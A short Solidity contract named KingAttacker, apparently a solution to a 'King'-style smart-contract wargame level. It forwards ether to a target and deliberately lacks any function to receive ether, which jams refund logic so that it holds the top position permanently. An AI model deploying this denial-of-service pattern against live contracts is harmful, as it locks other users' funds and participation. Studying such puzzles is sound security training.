// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract KingAttacker {
    function sendEth(address payable _target) public payable {
        (bool sent, ) = address(_target).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}